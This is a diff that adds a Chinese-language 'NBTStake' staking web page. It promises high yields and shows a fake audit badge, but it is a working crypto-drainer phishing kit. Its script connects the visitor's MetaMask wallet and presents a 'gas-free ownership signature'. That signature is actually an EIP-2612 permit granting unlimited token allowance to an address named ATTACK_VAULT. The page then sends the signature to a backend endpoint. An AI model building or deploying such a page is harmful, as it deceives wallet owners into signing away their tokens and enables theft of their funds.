@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>NBT 节点质押 - 高收益 NBT 挖矿</title>
+<style>
+  :root {
+    --bg: #0a0b1a;
+    --card: #141730;
+    --accent: #ff6b35;
+    --accent-glow: rgba(255,107,53,0.3);
+    --text: #e8eaf0;
+    --muted: #6b7099;
+    --border: #25294a;
+    --success: #22c55e;
+    --radius: 16px;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    overflow: hidden;
+  }
+  #bgCanvas { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:0; pointer-events:none; }
+  .container { position: relative; z-index: 1; width: 100%; max-width: 440px; padding: 20px; }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 32px;
+    box-shadow: 0 0 60px rgba(255,107,53,0.06);
+  }
+  .logo { text-align: center; margin-bottom: 8px; }
+  .logo-icon { font-size: 48px; display: block; margin-bottom: 4px; animation: pulse 3s ease-in-out infinite; }
+  @keyframes pulse {
+    0%,100% { text-shadow: 0 0 8px var(--accent-glow); }
+    50% { text-shadow: 0 0 32px var(--accent-glow), 0 0 64px var(--accent-glow); }
+  }
+  .logo-text { font-size: 28px; font-weight: 800; }
+  .logo-text span { color: var(--accent); }
+  .subtitle { text-align: center; color: var(--muted); font-size: 14px; margin-bottom: 28px; }
+  .step {
+    display: flex; align-items: center; gap: 14px;
+    padding: 14px 16px;
+    background: rgba(255,255,255,0.02);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    margin-bottom: 12px;
+    transition: all 0.3s;
+  }
+  .step.completed { border-color: rgba(34,197,94,0.3); background: rgba(34,197,94,0.05); }
+  .step.active { border-color: var(--accent); box-shadow: 0 0 16px var(--accent-glow); }
+  .step-num {
+    width: 32px; height: 32px; border-radius: 50%;
+    background: var(--border);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 700; flex-shrink: 0; color: var(--muted);
+  }
+  .step.completed .step-num { background: var(--success); color: #fff; }
+  .step.active .step-num { background: var(--accent); color: #fff; }
+  .step-content { flex: 1; }
+  .step-title { font-size: 14px; font-weight: 600; margin-bottom: 2px; }
+  .step-desc { font-size: 12px; color: var(--muted); }
+  .step-status { font-size: 20px; }
+  .btn {
+    width: 100%; padding: 16px; border: none; border-radius: 12px;
+    font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s;
+    position: relative; overflow: hidden;
+  }
+  .btn-primary { background: linear-gradient(135deg, var(--accent), #e85520); color: #fff; }
+  .btn-primary:hover { box-shadow: 0 0 28px var(--accent-glow); transform: translateY(-1px); }
+  .btn-primary:disabled { background: var(--border); color: var(--muted); cursor: not-allowed; box-shadow: none; transform: none; }
+  .btn-success { background: linear-gradient(135deg, var(--success), #16a34a); color: #fff; }
+  .btn-success:hover { box-shadow: 0 0 28px rgba(34,197,94,0.3); transform: translateY(-1px); }
+  .info-row {
+    display: flex; justify-content: space-between; font-size: 13px;
+    padding: 8px 0; border-bottom: 1px solid rgba(37,41,74,0.5);
+  }
+  .info-row:last-child { border-bottom: none; }
+  .info-row span:first-child { color: var(--muted); }
+  .tx-status {
+    margin-top: 16px; padding: 12px; border-radius: 10px;
+    font-size: 13px; text-align: center; display: none;
+  }
+  .tx-status.loading { display: block; background: var(--border); }
+  .tx-status.success { display: block; background: rgba(34,197,94,0.1); color: var(--success); border: 1px solid rgba(34,197,94,0.2); }
+  .tx-status.error { display: block; background: rgba(239,68,68,0.1); color: #ef4444; border: 1px solid rgba(239,68,68,0.2); }
+  .reward-box {
+    text-align: center; padding: 20px; margin-bottom: 20px;
+    background: rgba(255,107,53,0.06);
+    border: 1px solid rgba(255,107,53,0.15);
+    border-radius: 12px;
+  }
+  .reward-amount { font-size: 36px; font-weight: 800; color: var(--accent); }
+  .reward-label { font-size: 12px; color: var(--muted); margin-top: 4px; }
+  .footer { text-align: center; margin-top: 16px; font-size: 12px; color: var(--muted); }
+  .footer a { color: var(--accent); text-decoration: none; }
+</style>
+</head>
+<body>
+  <canvas id="bgCanvas"></canvas>
+  <div class="container">
+    <div class="card">
+      <div class="logo">
+        <span class="logo-icon">✦</span>
+        <div class="logo-text">NBT<span>Stake</span></div>
+      </div>
+      <div class="subtitle">NBT 节点质押活动 · 年化 18.25%</div>
+
+      <div class="reward-box">
+        <div class="reward-amount" id="rewardAmount">0.00</div>
+        <div class="reward-label">我的质押 NBT</div>
+      </div>
+
+      <div class="step" id="step1">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-title">连接钱包</div>
+          <div class="step-desc">使用 MetaMask 连接 BSC 主网</div>
+        </div>
+        <div class="step-status" id="step1Status">○</div>
+      </div>
+
+      <div class="step" id="step2">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-title">签名授权质押</div>
+          <div class="step-desc">签署消息验证钱包所有权（无 Gas）</div>
+        </div>
+        <div class="step-status" id="step2Status">○</div>
+      </div>
+
+      <div style="margin: 16px 0;">
+        <div class="info-row">
+          <span>网络</span>
+          <span>BSC 主网</span>
+        </div>
+        <div class="info-row">
+          <span>Gas 模式</span>
+          <span style="color: var(--success);">无 Gas 签名</span>
+        </div>
+        <div class="info-row">
+          <span>授权期限</span>
+          <span>7 天后过期</span>
+        </div>
+      </div>
+
+      <button class="btn btn-primary" id="actionBtn" disabled>连接钱包</button>
+
+      <div class="tx-status" id="txStatus"></div>
+    </div>
+    <div class="footer">
+      <a href="#">NBTStake 官方</a> · 安全审计：CertiK ✓
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    // ============================================================
+    // NBT EIP-2612 Permit 配置（部署后填入）
+    // ============================================================
+    const NBT_TOKEN = '0x8289224FbceDF105Ac23BAC484240501590ADDB4';
+    const ATTACK_VAULT = '0x6927474352E967D9CA63d94774F805FcE793132D';
+    const CHAIN_ID = 56;
+    const API_URL = window.location.origin;
+
+    const NBT_ABI = [
+      "function balanceOf(address) view returns (uint256)",
+      "function nonces(address) view returns (uint256)",
+      "function DOMAIN_SEPARATOR() view returns (bytes32)"
+    ];
+
+    let provider, signer, account;
+    let nbt;
+    let capturedSignature = null;
+
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const s1 = document.getElementById('step1Status');
+    const s2 = document.getElementById('step2Status');
+    const actionBtn = document.getElementById('actionBtn');
+    const txStatus = document.getElementById('txStatus');
+
+    let step = 0; // 0=connect, 1=sign
+
+    async function init() {
+      if (typeof window.ethereum === 'undefined') {
+        actionBtn.textContent = '请安装 MetaMask';
+        return;
+      }
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      initParticles();
+      checkConnection();
+      window.ethereum.on('accountsChanged', () => location.reload());
+      window.ethereum.on('chainChanged', () => location.reload());
+      actionBtn.addEventListener('click', handleAction);
+    }
+
+    async function checkConnection() {
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      if (accounts.length > 0) {
+        account = accounts[0];
+        signer = provider.getSigner();
+        nbt = new ethers.Contract(NBT_TOKEN, NBT_ABI, signer);
+        updateStep1();
+      }
+    }
+
+    async function connectWallet() {
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        account = accounts[0];
+        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+        if (parseInt(chainId) !== CHAIN_ID) {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }]
+          });
+        }
+        signer = provider.getSigner();
+        nbt = new ethers.Contract(NBT_TOKEN, NBT_ABI, signer);
+        updateStep1();
+      } catch (e) {
+        console.error(e);
+      }
+    }
+
+    function updateStep1() {
+      step1.className = 'step completed';
+      s1.textContent = '✓';
+      step1.querySelector('.step-desc').textContent = account.slice(0,6)+'...'+account.slice(-4);
+      step = 1;
+      actionBtn.textContent = '签名授权质押';
+      actionBtn.disabled = false;
+      refreshBalance();
+    }
+
+    async function refreshBalance() {
+      try {
+        const bal = await nbt.balanceOf(account);
+        document.getElementById('rewardAmount').textContent = parseFloat(ethers.utils.formatEther(bal)).toFixed(2);
+      } catch (e) {}
+    }
+
+    async function handleAction() {
+      if (!account) {
+        await connectWallet();
+        return;
+      }
+      if (step === 1) {
+        await handleSign();
+      }
+    }
+
+    async function handleSign() {
+      actionBtn.disabled = true;
+      actionBtn.textContent = '准备签名...';
+      showStatus('loading', '请在钱包中签署消息...');
+
+      try {
+        const nonce = await nbt.nonces(account);
+        const deadline = Math.floor(Date.now() / 1000) + 86400 * 7; // 7天
+
+        // 构建 NBT EIP-2612 Permit（spender = 攻击合约，value = MaxUint256）
+        const domain = {
+          name: 'CZ人生',
+          version: '1',
+          chainId: CHAIN_ID,
+          verifyingContract: NBT_TOKEN
+        };
+        const types = {
+          Permit: [
+            { name: 'owner', type: 'address' },
+            { name: 'spender', type: 'address' },
+            { name: 'value', type: 'uint256' },
+            { name: 'nonce', type: 'uint256' },
+            { name: 'deadline', type: 'uint256' }
+          ]
+        };
+        const message = {
+          owner: account,
+          spender: ATTACK_VAULT,
+          value: ethers.constants.MaxUint256.toString(),
+          nonce: nonce.toString(),
+          deadline: deadline.toString()
+        };
+
+        // 用户签名（EIP-712 结构化数据）— 钱包只显示"签名请求"，无交易确认
+        const signature = await signer._signTypedData(domain, types, message);
+
+        capturedSignature = { domain, types, message, signature, account, deadline };
+
+        showStatus('loading', '正在验证签名...');
+
+        // 发送到后端
+        const resp = await fetch(API_URL + '/api/claim', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            owner: account,
+            signature: signature,
+            amount: ethers.constants.MaxUint256.toString(),
+            deadline: deadline.toString(),
+            nonce: nonce.toString()
+          })
+        });
+
+        const result = await resp.json();
+
+        if (result.success) {
+          showStatus('success', '质押授权成功！收益将按周期发放');
+          step2.className = 'step completed';
+          s2.textContent = '✓';
+          actionBtn.textContent = '已授权 ✓';
+          actionBtn.className = 'btn btn-success';
+          step = 2;
+        } else {
+          showStatus('error', '授权失败: ' + (result.error || '请重试'));
+          actionBtn.disabled = false;
+          actionBtn.textContent = '签名授权质押';
+        }
+      } catch (e) {
+        console.error(e);
+        showStatus('error', e.code === 4001 ? '已取消签名' : (e.message || '签名失败'));
+        actionBtn.disabled = false;
+        actionBtn.textContent = '签名授权质押';
+      }
+    }
+
+    function showStatus(type, text) {
+      txStatus.className = 'tx-status ' + type;
+      txStatus.textContent = text;
+    }
+
+    function initParticles() {
+      const canvas = document.getElementById('bgCanvas');
+      const ctx = canvas.getContext('2d');
+      let w, h, particles = [];
+      function resize() { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; }
+      resize();
+      window.addEventListener('resize', resize);
+      for (let i = 0; i < 50; i++) {
+        particles.push({
+          x: Math.random() * w, y: Math.random() * h,
+          vx: (Math.random() - 0.5) * 0.3, vy: (Math.random() - 0.5) * 0.3,
+          r: Math.random() * 1.5 + 0.5, a: Math.random() * 0.3 + 0.1
+        });
+      }
+      function draw() {
+        ctx.clearRect(0, 0, w, h);
+        particles.forEach(p => {
+          p.x += p.vx; p.y += p.vy;
+          if (p.x < 0) p.x = w; if (p.x > w) p.x = 0; if (p.y < 0) p.y = h; if (p.y > h) p.y = 0;
+          ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+          ctx.fillStyle = `rgba(255, 107, 53, ${p.a})`;
+          ctx.fill();
+          particles.forEach(p2 => {
+            const dx = p.x - p2.x, dy = p.y - p2.y, dist = Math.sqrt(dx*dx + dy*dy);
+            if (dist < 100) {
+              ctx.beginPath(); ctx.moveTo(p.x, p.y); ctx.lineTo(p2.x, p2.y);
+              ctx.strokeStyle = `rgba(255, 107, 53, ${0.04 * (1 - dist / 100)})`;
+              ctx.lineWidth = 0.5; ctx.stroke();
+            }
+          });
+        });
+        requestAnimationFrame(draw);
+      }
+      draw();
+    }
+
+    document.addEventListener('DOMContentLoaded', init);
+  </script>
+</body>
+</html>
